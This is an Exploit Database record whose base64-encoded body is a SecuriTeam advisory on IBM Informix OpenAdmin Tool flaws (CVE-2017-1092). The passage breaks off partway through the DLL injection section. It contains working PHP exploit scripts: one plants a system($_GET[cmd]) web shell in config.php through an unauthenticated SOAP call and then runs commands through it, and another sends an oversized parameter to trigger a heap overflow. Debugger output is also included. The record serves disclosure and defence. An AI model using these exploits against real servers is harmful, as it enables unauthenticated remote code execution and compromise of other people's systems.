{
    "source": "exploit-database", 
    "exploit": "VnVsbmVyYWJpbGl0aWVzIFN1bW1hcnkNClRoZSBmb2xsb3dpbmcgYWR2aXNvcnkgZGVzY3JpYmVzIHNpeCAoNikgdnVsbmVyYWJpbGl0aWVzIGZvdW5kIGluIEluZm9ybWl4IER5bmFtaWMgU2VydmVyIGFuZCBJbmZvcm1peCBPcGVuIEFkbWluIFRvb2wuDQoNCklCTSBJbmZvcm1peCBEeW5hbWljIFNlcnZlciBFeGNlcHRpb25hbCwgbG93IG1haW50ZW5hbmNlIG9ubGluZSB0cmFuc2FjdGlvbiBwcm9jZXNzaW5nIChPTFRQKSBkYXRhIHNlcnZlciBmb3IgZW50ZXJwcmlzZSBhbmQgd29ya2dyb3VwIGNvbXB1dGluZy4NCg0KSUJNIEluZm9ybWl4IER5bmFtaWMgU2VydmVyIGhhcyBtYW55IGZlYXR1cmVzIHRoYXQgY2F0ZXIgdG8gYSB2YXJpZXR5IG9mIHVzZXIgZ3JvdXBzLCBpbmNsdWRpbmcgZGV2ZWxvcGVycyBhbmQgYWRtaW5pc3RyYXRvcnMuIE9uZSBvZiB0aGUgc3Ryb25nIGZlYXR1cmVzIG9mIElEUyBpcyB0aGUgbG93IGFkbWluaXN0cmF0aW9uIGNvc3QuIElEUyBpcyB3ZWxsIGtub3duIGZvciBpdHMgaGFuZHMtZnJlZSBhZG1pbmlzdHJhdGlvbi4gVG8gbWFrZSBzZXJ2ZXIgYWRtaW5pc3RyYXRpb24gZXZlbiBlYXNpZXIsIGEgbmV3IG9wZW4gc291cmNlLCBwbGF0Zm9ybS1pbmRlcGVuZGVudCB0b29sIGNhbGxlZCBPcGVuQWRtaW4gVG9vbCAoT0FUKSBpcyBub3cgYXZhaWxhYmxlIHRvIElEUyB1c2Vycy4gVGhlIE9BVCBpbmNsdWRlcyBhIGdyYXBoaWNhbCBpbnRlcmZhY2UgZm9yIGFkbWluaXN0cmF0aXZlIHRhc2tzIGFuZCBwZXJmb3JtYW5jZSBhbmFseXNpcyB0b29scy4NCg0KVnVsbmVyYWJpbGl0aWVzOg0KDQpVbmF1dGhlbnRpY2F0aW9uIHN0YXRpYyBQSFAgY29kZSBpbmplY3Rpb24gdGhhdCBsZWFkcyB0byByZW1vdGUgY29kZSBleGVjdXRpb24NCkhlYXAgYnVmZmVyIG92ZXJmbG93DQpSZW1vdGUgRExMIEluamVjdGlvbiB0aGF0IGxlYWRzIHRvIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiAoMSkNClJlbW90ZSBETEwgSW5qZWN0aW9uIHRoYXQgbGVhZHMgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uICgyKQ0KUmVtb3RlIERMTCBJbmplY3Rpb24gdGhhdCBsZWFkcyB0byByZW1vdGUgY29kZSBleGVjdXRpb24gKDMpDQpSZW1vdGUgRExMIEluamVjdGlvbiB0aGF0IGxlYWRzIHRvIHJlbW90ZSBjb2RlIGV4ZWN1dGlvbiAoNCkNCkNyZWRpdA0KQW4gaW5kZXBlbmRlbnQgc2VjdXJpdHkgcmVzZWFyY2hlciBoYXMgcmVwb3J0ZWQgdGhpcyB2dWxuZXJhYmlsaXR5IHRvIEJleW9uZCBTZWN1cml0eeKAmXMgU2VjdXJpVGVhbSBTZWN1cmUgRGlzY2xvc3VyZSBwcm9ncmFtDQoNClZlbmRvciByZXNwb25zZQ0KSUJNIGhhcyByZWxlYXNlZCBwYXRjaGVzIHRvIGFkZHJlc3MgdGhvc2UgdnVsbmVyYWJpbGl0aWVzIGFuZCBpc3N1ZWQgdGhlIGZvbGxvd2luZyBDVkXigJlzOg0KDQpDVkUtMjAxNy0xMDkyDQpGb3IgbW9yZSBJbmZvcm1hdGlvbiDigJMgaHR0cDovL3d3dy0wMS5pYm0uY29tL3N1cHBvcnQvZG9jdmlldy53c3M/dWlkPXN3ZzIyMDAyODk3DQoNCg0KVnVsbmVyYWJpbGl0aWVzIERldGFpbHMNCklCTSBJbmZvcm1peCBEeW5hbWljIFNlcnZlciBpbnN0YWxscyBhIFBIUCBlbmFibGUgQXBhY2hlIHNlcnZlciBhcyBhIFdpbmRvd3MgU2VydmljZSAo4oCcQXBhY2hlX2Zvcl9PQVTigJ0pIHdoaWNoIGxpc3RlbnMgb24gcHVibGljIHBvcnQgODA4MCAodGNwL2h0dHApIGZvciBpbmNvbWluZyByZXF1ZXN0cyB0byB0aGUgT3BlbkFkbWluIHdlYiBwYW5lbC4gSXQgcnVucyB3aXRoIE5UIEFVVEhPUklUWVxTWVNURU0gcHJpdmlsZWdlcy4NCg0KVW5hdXRoZW50aWNhdGlvbiBzdGF0aWMgUEhQIGNvZGUgaW5qZWN0aW9uIHRoYXQgbGVhZHMgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uDQpJQk0gSW5mb3JtaXggRHluYW1pYyBTZXJ2ZXIgRGV2ZWxvcGVyIGlzIHZ1bG5lcmFibGUgdG8gVW5hdXRoZW50aWNhdGlvbiBzdGF0aWMgUEhQIGNvZGUgaW5qZWN0aW9uIGJ5IGludm9raW5nIHdlbGNvbWVTZXJ2aWNlLnBocCB3aGljaCBvZmZlcnMgYSBTT0FQIGludGVyZmFjZS4NCg0KVGhlIHdlbGNvbWVTZXJ2ZXIucGhwIGNsYXNzIHN1ZmZlcnMgb2YgYSBzdGF0aWMgUEhQIGNvZGUgaW5qZWN0aW9uIGludG8gdGhlIOKAnHNhdmVIb21lUGFnZeKAnSBtZXRob2QuIEFyYml0cmFyeSBjb2RlIGNhbiBiZSBpbmplY3RlZCBpbnRvIOKAmGNvbmZpZy5waHDigJgsIHdoaWNoIGlzIGFjY2Vzc2libGUgdG8gcmVtb3RlIHVzZXJzLiBHaXZlbiB0aGlzLCBhIHJlbW90ZSBhdHRhY2tlciBjb3VsZCBleGVjdXRlIGFyYml0cmFyeSBjb2RlL2NvbW1hbmRzIHdpdGggdGhlIHByaXZpbGVnZXMgb2YgdGhlIHRhcmdldCBzZXJ2aWNlLg0KDQpWdWxuZXJhYmxlIGNvZGUg4oCTIEM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZVxPQVRcQXBhY2hlXzIuMi4yMlxodGRvY3Ncb3BlbmFkbWluXHNlcnZpY2VzXHdlbGNvbWVcd2VsY29tZVNlcnZpY2UucGhwDQoNCi4uLg0KPD9waHANClsuLl0NCg0KJGluaSA9IGluaV9zZXQoInNvYXAud3NkbF9jYWNoZV9lbmFibGVkIiwiMCIpOw0KDQpyZXF1aXJlX29uY2UoIndlbGNvbWVTZXJ2ZXIucGhwIik7DQoNCiRzZXJ2ZXIgPSBuZXcgU29hcFNlcnZlcigid2VsY29tZS53c2RsIik7DQokc2VydmVyLT5zZXRDbGFzcygid2VsY29tZVNlcnZlciIpOw0KaWYgKGlzc2V0KCRIVFRQX1JBV19QT1NUX0RBVEEpKSANCgl7DQoJJHJlcXVlc3QgPSAkSFRUUF9SQVdfUE9TVF9EQVRBOw0KfSBlbHNlIA0KCXsNCgkkcmVxdWVzdCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCdwaHA6Ly9pbnB1dCcpOw0KfQ0KDQokc2VydmVyLT5oYW5kbGUoJHJlcXVlc3QpOw0KPz4NCi4uLg0KDQpJZiB3ZSB3aWxsIGxvb2sgaW50byBzYXZlSG9tZVBhZ2UoKSBtZXRob2QgaW5zaWRlDQpDOlxQcm9ncmFtIEZpbGVzICh4ODYpXElCTSBJbmZvcm1peCBTb2Z0d2FyZSBCdW5kbGVcT0FUXEFwYWNoZV8yLjIuMjJcaHRkb2NzXG9wZW5hZG1pblxzZXJ2aWNlc1x3ZWxjb21lXHdlbGNvbWVTZXJ2ZXIucGhwOg0KDQouLi4NCi8qKg0KCSAqIFNhdmUgdGhlIHNlbGVjdGVkIGhvbWUgcGFnZSBpbiB0aGUgY29uZmlnLnBocCBmaWxlLg0KCSAqLw0KCXB1YmxpYyBmdW5jdGlvbiBzYXZlSG9tZVBhZ2UgKCRuZXdfaG9tZV9wYWdlKSAgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KCXsNCgkJJHRoaXMtPmlkc2FkbWluLT5sb2FkX2xhbmcoImFkbWluIik7DQoJCSRjb25mX3ZhcnMgPSAkdGhpcy0+aWRzYWRtaW4tPmdldF9jb25maWcoIioiKTsNCgkJDQoJCS8vIGNyZWF0ZSBiYWNrdXAgb2YgY29uZmlnIGZpbGUNCgkJJHNyYz0kY29uZl92YXJzWydIT01FRElSJ10uIi9jb25mL2NvbmZpZy5waHAiOw0KCQkkZGVzdD0kY29uZl92YXJzWydIT01FRElSJ10uIi9jb25mL0JBS2NvbmZpZy5waHAiOw0KCQljb3B5KCRzcmMsJGRlc3QpOw0KCQkNCgkJLy8gb3BlbiB0aGUgY29uZmlnIGZpbGUNCgkJaWYgKCEgaXNfd3JpdGFibGUoJHNyYykpDQoJCXsNCgkJCXRyaWdnZXJfZXJyb3IoJHRoaXMtPmlkc2FkbWluLT5sYW5nKCJTYXZlQ2ZnRmFpbHVyZSIpLiAiICRzcmMiKTsNCgkJCXJldHVybjsNCgkJfQ0KCQkkZmQgPSBmb3Blbigkc3JjLCd3KycpOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tIFsqXQ0KCQkvLyB3cml0ZSBvdXQgdGhlIGNvbmZpZw0KCQlmcHV0cygkZmQsIjw/cGhwIFxuIik7DQoJCWZvcmVhY2ggKCRjb25mX3ZhcnMgYXMgJGsgPT4gJHYpDQoJCXsNCgkJCWlmICgkayA9PSAiSE9NRVBBR0UiKQ0KCQkJew0KCQkJCSR2ID0gJG5ld19ob21lX3BhZ2U7IDwtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbKipdDQoJCQl9DQoJCQllbHNlIGlmICgkayA9PSAiQ09OTkRCRElSIiB8fCAkayA9PSAiSE9NRURJUiIpIA0KCQkJew0KCQkJCS8vIFJlcGxhY2UgYmFja3NsYXNoZXMgaW4gcGF0aHMgd2l0aCBmb3J3YXJkIHNsYXNoZXMNCgkJCQkkdGhpcy0+aWRzYWRtaW4tPmluWyRrXSA9IHN0cl9yZXBsYWNlKCdcXCcsICcvJywgJHRoaXMtPmlkc2FkbWluLT5pblska10pOyANCgkJCQkvKiBpZHNkYjAwNDk0NTgxOiBBbiBleHRyYSAnIicgZ2V0cyB3cml0dGVuIHRvICRDT05GWydDT05OREJESVInXSBpbiBjb25maWcucGhwDQoJCQkJICogc2lsZW50IGluc3RhbGwgaW4gL3ZvYnMvaWRzYWRtaW4vaWRzYWRtaW4vaW5zdGFsbC9pbmRleC5waHA6c2F2ZURlZmF1bHRDb25maWcoKSB3cml0ZXMgdGhlIGFib3ZlIGxpbmUNCgkJCQkgKiBiYXNlZCBvbiAkY29ubmRiZGlyID0gYWRkc2xhc2hlcyhzdWJzdHIoQCRfU0VSVkVSWydhcmd2J11bM10sMTEpKTsgVE9ETzogZml4IHRoZSBpbml0aWFsIHdyaXRpbmcgaW50byBjb25maWcucGhwIChXaW5kb3dzIG9ubHkgaXNzdWUpDQoJCQkJICovDQoJCQkJaWYgKCR2W3N0cmxlbigkdiktMV0gPT0gJyInKSB7DQoJCQkJCSR2ID0gc3Vic3RyKCR2LCAwLCAtMSk7DQoJCQkJfQkJCQkNCgkJCX0NCgkJCSRvdXQgPSAiXCRDT05GWyd7JGt9J109XCJ7JHZ9XCI7I3skdGhpcy0+aWRzYWRtaW4tPmxhbmcoJGspfVxuIjsgPC0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSBbKioqXQ0KCQkJZnB1dHMoJGZkLCRvdXQpOyA8LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0gWyoqKipdDQoJCX0NCgkJZnB1dHMoJGZkLCI/PlxuIik7DQoJCWZjbG9zZSgkZmQpOw0KCQkNCgkJcmV0dXJuICRuZXdfaG9tZV9wYWdlOw0KCX0NCi4uLg0KDQpOb3RlIHRoYXQgJG5ld19ob21lX3BhZ2UgaXMgdGhlIHVuaXF1ZSBwYXJhbWV0ZXIgb2YgYSBTT0FQIHJlcXVlc3QgYW5kIGl0IGlzIGNvbnRyb2xsZWQ7DQoNClRoZSByZXN1bHRpbmcgZmlsZSBjb3VsZCBsb29rIGxpa2UgdGhpczoNCg0KLi4uDQogDQo8P3BocCANCiRDT05GWydMQU5HJ109ImVuX1VTIjsjVGhlIGRlZmF1bHQgbGFuZ3VhZ2UgZm9yIHRoZSBPQVQgcGFnZXMuDQokQ09ORlsnQkFTRVVSTCddPSJodHRwOi8vV0lOLVBGMlZNRFQ0TVZPOjgwODAvb3BlbmFkbWluIjsjVGhlIFVSTCB3aGVyZSBPQVQgaXMgaW5zdGFsbGVkIGluIHRoaXMgZm9ybWF0OiBodHRwOi8vc2VydmVybmFtZTpwb3J0L2xvY2F0aW9uLg0KJENPTkZbJ0hPTUVESVInXT0iQzovUHJvZ3JhbSBGaWxlcyAoeDg2KS9JQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlL09BVC9BcGFjaGVfMi4yLjIyL2h0ZG9jcy9vcGVuYWRtaW4vIjsjVGhlIGRpcmVjdG9yeSBmb3IgdGhlIE9BVCBpbnN0YWxsYXRpb24uDQokQ09ORlsnQ09OTkRCRElSJ109IkM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZVxPQVRcT0FUX2NvbmYiOyNUaGUgZGlyZWN0b3J5IGZvciB0aGUgT0FUIGNvbm5lY3Rpb25zIGRhdGFiYXNlLiBTcGVjaWZ5IGEgc2VjdXJlIGRpcmVjdG9yeSB0aGF0IGlzIG5vdCB1bmRlciB0aGUgZG9jdW1lbnQgZGlyZWN0b3J5IGZvciB0aGUgd2ViIHNlcnZlci4NCiRDT05GWydIT01FUEFHRSddPSIiO3N5c3RlbSgkX0dFVFtjbWRdKTsvLyI7I1RoZSBwYWdlIHRvIHVzZSBhcyB0aGUgT0FUIGhvbWUgcGFnZS4NCiRDT05GWydQSU5HSU5URVJWQUwnXT0iMzAwIjsjVGhlIGxlbmd0aCBvZiB0aW1lIChpbiBzZWNvbmRzKSBiZXR3ZWVuIHVwZGF0ZXMgb2YgdGhlIHNlcnZlciBzdGF0dXMuIFRoZSBzZXJ2ZXIgc3RhdHVzIGlzIHNob3duIG9uIHRoZSBIZWFsdGggQ2VudGVyID4gRGFzaGJvYXJkID4gR3JvdXAgU3VtbWFyeSBwYWdlLg0KJENPTkZbJ1JPV1NQRVJQQUdFJ109IjI1IjsjVGhlIGRlZmF1bHQgbnVtYmVyIG9mIHJvd3MgcGVyIHBhZ2UgdG8gZGlzcGxheSB3aGVuIGRhdGEgaXMgc2hvd24gaW4gYSB0YWJsZSBmb3JtYXQuDQokQ09ORlsnU0VDVVJFU1FMJ109Im9uIjsjUmVxdWlyZSBsb2dpbiBjcmVkZW50aWFscyBmb3IgdGhlIFNRTCBUb29sQm94Lg0KJENPTkZbJ0lORk9STUlYQ09OVElNRSddPSIyMCI7I1RoZSBsZW5ndGggb2YgdGltZSAoaW4gc2Vjb25kcykgdGhhdCBPQVQgYXR0ZW1wdHMgdG8gY29ubmVjdCB0byB0aGUgZGF0YWJhc2Ugc2VydmVyIGJlZm9yZSByZXR1cm5pbmcgYW4gZXJyb3IgKElORk9STUlYQ09OVElNRSkuDQokQ09ORlsnSU5GT1JNSVhDT05SRVRSWSddPSIzIjsjVGhlIG51bWJlciBvZiB0aW1lcyB0aGF0IE9BVCBhdHRlbXB0cyB0byBjb25uZWN0IHRvIHRoZSBkYXRhYmFzZSBzZXJ2ZXIgZHVyaW5nIHRoZSBJbmZvcm1peCBjb25uZWN0IHRpbWUgKElORk9STUlYQ09OUkVUUlkpLg0KJENPTkZbJ0lORk9STUlYRElSJ109IkM6XFByb2dyYW0gRmlsZXMgKHg4NilcSUJNIEluZm9ybWl4IFNvZnR3YXJlIEJ1bmRsZSI7I01JU1NJTkcgTEFORyBGSUxFIElURU0gSU5GT1JNSVhESVINCj8+DQouLi4NCg0KY29uZmlnLnBocCBpcyBub3QgcHJvdGVjdGVkIHNvIHdlIGNhbiBleGVjdXRlIHN5c3RlbSgpIHRocm91Z2ggYSBHRVQgcmVxdWVzdC4NCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQo8P3BocA0KDQplcnJvcl9yZXBvcnRpbmcoMCk7DQokaG9zdCA9ICRhcmd2WzFdOw0KJHBvcnQgPSA4MDgwOw0KDQokc2hlbGwgPSBodG1sZW50aXRpZXMoIlwiO3N5c3RlbShcJF9HRVRbY21kXSk7Ly8iKTsNCg0KJGRhdGE9Jw0KPHNvYXBlbnY6RW52ZWxvcGUgeG1sbnM6eHNpPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYS1pbnN0YW5jZSIgeG1sbnM6eHNkPSJodHRwOi8vd3d3LnczLm9yZy8yMDAxL1hNTFNjaGVtYSIgeG1sbnM6c29hcGVudj0iaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvc29hcC9lbnZlbG9wZS8iIHhtbG5zOnVybj0idXJuOldlbGNvbWUiPg0KICAgPHNvYXBlbnY6SGVhZGVyLz4NCiAgIDxzb2FwZW52OkJvZHk+DQogICAgICA8dXJuOnNhdmVIb21lUGFnZSBzb2FwZW52OmVuY29kaW5nU3R5bGU9Imh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3NvYXAvZW5jb2RpbmcvIj4NCiAgICAgICAgIDxuZXdfaG9tZV9wYWdlIHhzaTp0eXBlPSJ4c2Q6c3RyaW5nIj4nLiRzaGVsbC4nPC9uZXdfaG9tZV9wYWdlPg0KICAgICAgPC91cm46c2F2ZUhvbWVQYWdlPg0KICAgPC9zb2FwZW52OkJvZHk+DQo8L3NvYXBlbnY6RW52ZWxvcGU+DQonOw0KJHBrPSJQT1NUIC9vcGVuYWRtaW4vc2VydmljZXMvd2VsY29tZS93ZWxjb21lU2VydmljZS5waHAgSFRUUC8xLjFcclxuIi4NCiAgICAiSG9zdDogIi4kaG9zdC4iXHJcbiIuDQogICAgIkNvbnRlbnQtVHlwZTogdGV4dC94bWw7Y2hhcnNldD1VVEYtOA0KXHJcbiIuDQogICAgIkNvbnRlbnQtTGVuZ3RoOiAiLnN0cmxlbigkZGF0YSkuIlxyXG4iLg0KICAgICJTT0FQQWN0aW9uOiBcInVybjpRQkVBY3Rpb25cIlxyXG4iLg0KICAgICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIi4NCiAgICAkZGF0YTsNCiAgIA0KJGZwID0gZnNvY2tvcGVuKCRob3N0LCRwb3J0LCRlLCRlcnIsNSk7DQoNCmZwdXRzKCRmcCwkcGspOw0KJG91dD0iIjsNCndoaWxlICghZmVvZigkZnApKXsNCiAgJG91dC49ZnJlYWQoJGZwLDEpOw0KfQ0KZmNsb3NlKCRmcCk7DQovL2VjaG8gJG91dC4iXG4iOw0KDQokcGs9IkdFVCAvb3BlbmFkbWluL2NvbmYvY29uZmlnLnBocD9jbWQ9d2hvYW1pIEhUVFAvMS4wXHJcbiIuDQogICAgIkhvc3Q6ICIuJGhvc3QuIlxyXG4iLg0KICAgICJDb25uZWN0aW9uOiBDbG9zZVxyXG5cclxuIjsNCiAgIA0KJGZwID0gZnNvY2tvcGVuKCRob3N0LCRwb3J0LCRlLCRlcnIsNSk7DQoNCmZwdXRzKCRmcCwkcGspOw0KJG91dD0iIjsNCndoaWxlICghZmVvZigkZnApKXsNCiAgJG91dC49ZnJlYWQoJGZwLDEpOw0KfQ0KZmNsb3NlKCRmcCk7DQplY2hvICRvdXQuIlxuIjsNCj8+DQoNCkhlYXAgYnVmZmVyIG92ZXJmbG93DQpJQk0gSW5mb3JtaXggRHluYW1pYyBTZXJ2ZXIgRGV2ZWxvcGVyIGlzIHZ1bG5lcmFibGUgdG8gVW5hdXRoZW50aWNhdGlvbiBoZWFwIGJ1ZmZlciBvdmVyZmxvdy4gQnkgc3VibWl0dGluZyBjb25uZWN0aW9uIHBhcmFtZXRlcnMgdG8gaW5kZXgucGhwLCB0aHJvdWdoIHRoZSDigJhzZXJ2ZXLigJkgcHJvcGVydHksIGl0IGlzIHBvc3NpYmxlIHRvIHRyaWdnZXIgYSBoZWFwIGJ1ZmZlciBvdmVyZmxvdyB2dWxuZXJhYmlsaXR5IGludG8gdGhlIHVuZGVybHlpbmcgUEhQIEluZm9ybWl4IGV4dGVuc2lvbiAocGhwX3Bkb19pbmZvcm1peC5kbGwpLg0KDQpXaGVuIGF0dGFjaGluZyBXaW5EYmcgdG8gdGhlIGh0dHBkLmV4ZSBzdWItcHJvY2VzcywgaXQgc2hvd3M6DQoNCigxNTgwLjY4Yyk6IEFjY2VzcyB2aW9sYXRpb24gLSBjb2RlIGMwMDAwMDA1IChmaXJzdCBjaGFuY2UpDQpGaXJzdCBjaGFuY2UgZXhjZXB0aW9ucyBhcmUgcmVwb3J0ZWQgYmVmb3JlIGFueSBleGNlcHRpb24gaGFuZGxpbmcuDQpUaGlzIGV4Y2VwdGlvbiBtYXkgYmUgZXhwZWN0ZWQgYW5kIGhhbmRsZWQuDQplYXg9MDA3YjUzNjAgZWJ4PTA0NzAxYmIwIGVjeD0wMDdiNTI3NCBlZHg9MDAwMDAyNzYgZXNpPTAxMDEwMTAxIGVkaT0wNDZmZTMxMA0KZWlwPTAwN2IxNGI1IGVzcD0wMWY4ZjYzMCBlYnA9MDQ3Njc3Y2MgaW9wbD0wICAgICAgICAgbnYgdXAgZWkgcGwgenIgbmEgcGUgbmMNCmNzPTAwMjMgIHNzPTAwMmIgIGRzPTAwMmIgIGVzPTAwMmIgIGZzPTAwNTMgIGdzPTAwMmIgICAgICAgICAgICAgZWZsPTAwMDEwMjQ2DQpwaHBfcGRvX2luZm9ybWl4KzB4MTRiNToNCjAwN2IxNGI1IDg5NDYxNCAgICAgICAgICBtb3YgICAgIGR3b3JkIHB0ciBbZXNpKzE0aF0sZWF4IGRzOjAwMmI6MDEwMTAxMTU9MTVmZjAxMmUNCg0KZXNpIGlzIGNvbnRyb2xsZWQgYnkgdGhlIGF0dGFja2VyIGFuZCBjb3VsZCBiZSB1c2VkIHRvIGV4ZWN1dGUgYXJiaXRyYXJ5IGNvZGUgb3IgdG8gY3JlYXRlIGRlbmlhbCBvZiBzZXJ2aWNlIGNvbmRpdGlvbnMNCg0KMDowMDI+IGxtIHZtIHBocF9wZG9faW5mb3JtaXgNCnN0YXJ0ICAgIGVuZCAgICAgICAgbW9kdWxlIG5hbWUNCjAxNGYwMDAwIDAxNGZhMDAwICAgcGhwX3Bkb19pbmZvcm1peCAgIChleHBvcnQgc3ltYm9scykgICAgICAgQzpcUHJvZ3JhbSBGaWxlcyAoeDg2KVxJQk0gSW5mb3JtaXggU29mdHdhcmUgQnVuZGxlXE9BVFxQSFBfNS4yLjRcZXh0XHBocF9wZG9faW5mb3JtaXguZGxsDQogICAgTG9hZGVkIHN5bWJvbCBpbWFnZSBmaWxlOiBDOlxQcm9ncmFtIEZpbGVzICh4ODYpXElCTSBJbmZvcm1peCBTb2Z0d2FyZSBCdW5kbGVcT0FUXFBIUF81LjIuNFxleHRccGhwX3Bkb19pbmZvcm1peC5kbGwNCiAgICBJbWFnZSBwYXRoOiBDOlxQcm9ncmFtIEZpbGVzICh4ODYpXElCTSBJbmZvcm1peCBTb2Z0d2FyZSBCdW5kbGVcT0FUXFBIUF81LjIuNFxleHRccGhwX3Bkb19pbmZvcm1peC5kbGwNCiAgICBJbWFnZSBuYW1lOiBwaHBfcGRvX2luZm9ybWl4LmRsbA0KICAgIFRpbWVzdGFtcDogICAgICAgIE1vbiBKdW4gMTUgMTc6MTM6NTcgMjAwOSAoNEEzNkUzQzUpDQogICAgQ2hlY2tTdW06ICAgICAgICAgMDAwMTVFNzENCiAgICBJbWFnZVNpemU6ICAgICAgICAwMDAwQTAwMA0KICAgIEZpbGUgdmVyc2lvbjogICAgIDUuMi40LjQNCiAgICBQcm9kdWN0IHZlcnNpb246ICA1LjIuNC4wDQogICAgRmlsZSBmbGFnczogICAgICAgMCAoTWFzayAzRikNCiAgICBGaWxlIE9TOiAgICAgICAgICA0IFVua25vd24gV2luMzINCiAgICBGaWxlIHR5cGU6ICAgICAgICAyLjAgRGxsDQogICAgRmlsZSBkYXRlOiAgICAgICAgMDAwMDAwMDAuMDAwMDAwMDANCiAgICBUcmFuc2xhdGlvbnM6ICAgICAwNDA5LjA0YjANCiAgICBDb21wYW55TmFtZTogICAgICBUaGUgUEhQIEdyb3VwDQogICAgUHJvZHVjdE5hbWU6ICAgICAgUEhQIHBocF9wZG9faW5mb3JtaXguZGxsDQogICAgSW50ZXJuYWxOYW1lOiAgICAgcGhwX3Bkb19pbmZvcm1peC5kbGwNCiAgICBPcmlnaW5hbEZpbGVuYW1lOiBwaHBfcGRvX2luZm9ybWl4LmRsbA0KICAgIFByb2R1Y3RWZXJzaW9uOiAgIDUuMi40DQogICAgRmlsZVZlcnNpb246ICAgICAgNS4yLjQuNA0KICAgIFByaXZhdGVCdWlsZDogICAgIDUuMi40LjQNCiAgICBTcGVjaWFsQnVpbGQ6ICAgICA1LjIuNC40DQogICAgRmlsZURlc2NyaXB0aW9uOiAgcGRvX2luZm9ybWl4DQogICAgTGVnYWxDb3B5cmlnaHQ6ICAgQ29weXJpZ2h0IMKpIDE5OTctMjAwNyBUaGUgUEhQIEdyb3VwDQogICAgTGVnYWxUcmFkZW1hcmtzOiAgUEhQDQogICAgQ29tbWVudHM6ICAgICAgICAgVGhhbmtzIHRvIFJpY2sgTWNHdWlyZSwgRGFuIFNjb3R0LCBLcmlzaG5hIFJhbWFuLCBLZWxsZW4gQm9tYmFyZGllcg0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCjw/cGhwDQovKg0KZXhhbXBsZSBjb25uZWN0aW9uIHN0cmluZzoNCmluZm9ybWl4Omhvc3Q9MTI3LjAuMC4xO3NlcnZpY2U9NzM2MDtkYXRhYmFzZT1zeXNtYXN0ZXI7cHJvdG9jb2w9b25zb2N0Y3A7c2VydmVyPVswWDAxIFggNjkwMDBdDQoqLw0KDQplcnJvcl9yZXBvcnRpbmcoMCk7DQokaG9zdCA9ICRhcmd2WzFdOw0KJHBvcnQgPSA4MDgwOw0KDQokZGF0YT0iUEFTU1dPUkQ9KiZVU0VSTkFNRT0qJlNFUlZFUj0iLnN0cl9yZXBlYXQoIlx4MDEiLDY5MDAwKS4iJkhPU1Q9MTI3LjAuMC4xJlBPUlQ9NzM2MCZJRFNQUk9UT0NPTD1vbnNvY3RjcCZURU5BTlRfREJPV05FUj0mVEVOQU5UX0RCTkFNRT0iOw0KJHBrPSJQT1NUIC9vcGVuYWRtaW4vaW5kZXgucGhwP2FjdD1sb2dpbiZkbz10ZXN0Y29ubiBIVFRQLzEuMVxyXG4iLg0KICAgICJIb3N0OiAiLiRob3N0LiJcclxuIi4NCiAgICAiQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWRcclxuIi4NCiAgICAiQ29udGVudC1MZW5ndGg6ICIuc3RybGVuKCRkYXRhKS4iXHJcbiIuDQogICAgIkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iLg0KICAgICRkYXRhOw0KICAgDQokZnAgPSBmc29ja29wZW4oJGhvc3QsJHBvcnQsJGUsJGVyciw1KTsNCmZwdXRzKCRmcCwkcGspOw0KJG91dD0iIjsNCndoaWxlICghZmVvZigkZnApKXsNCiAgJG91dC49ZnJlYWQoJGZwLDEpOw0KfQ0KZmNsb3NlKCRmcCk7DQplY2hvICRvdXQuIlxuIjsNCj8+DQoNClJlbW90ZSBETEwgSW5qZWN0aW9uIHRoYXQgbGVhZHMgdG8gcmVtb3RlIGNvZGUgZXhlY3V0aW9uICgxKQ0KSUJNIEluZm9ybWl4IER5bmFtaWMgU2VydmVyIERldmVsb3BlciBpcyB2dWxuZXJhYmxlIHRvIFVuYXV0aGVudGljYXRpb24gUmVtb3RlIERMTCBJbmplY3Rpb24gdGhhdCBsZWFkcyB0byByZW1vdGUgY29kZSBleGVjdXRpb24uDQoNCmJ5IHN1Ym1pdHRpbmcgY29ubmVjdGlvbiBwYXJhbWV0ZXJzIHRvIGluZGV4LnBocCwgc2V0dGluZyB0aGUg4oCYYWN04oCYIHBhcmFtZXRlciB0byDigJhsb2dpbuKAmCBhbmQgdGhlIOKAmGRv4oCYIG9uZSB0byDigJh0ZXN0Y29ubuKAmCwgaXQgaXMgcG9zc2libGUgdG8gaW5qZWN0IGFyYml0cmFyeSBzdGF0ZW1lbnRzIGludG8gYSBjb25uZWN0aW9uIHN0cmluZyBmb3IgdGhlIHVuZGVybHlpbmcgSW5mb3JtaXggZGF0YWJhc2UuDQoNClRoZSBfX2NvbnN0cnVjdCgpIG1ldGhvZCBvZiB0aGUgUERPX09BVC5waHAgbGlicmFyeSBwYXNzaW5nIHRoZW0gdG8gUERPOjpfX2NvbnN0cnVjdCgpIHdpdGhvdXQgcHJpb3Igc2Vuc2l0aXphdGlvbg0KDQpHaXZlbiB0aGlzIGl0IGlzIHBvc3NpYmxlIHRvIGluamVjdCB0aGUg4oCcVFJBTlNMQVRJT05ETEzigJ0gY29ubmVjdGlvbiBwYXJhbWV0ZXIgYW5kIHRvIHBvaW50IGl0IHRvIGFuIGFyYml0cmFyeSBkbGwgZnJvbSBhIHJlbW90ZSBuZXR3b3JrIHNoYXJlLCBwcmVwYXJlZCBieSB0aGUgYXR0YWNrZXIuIElmIHRo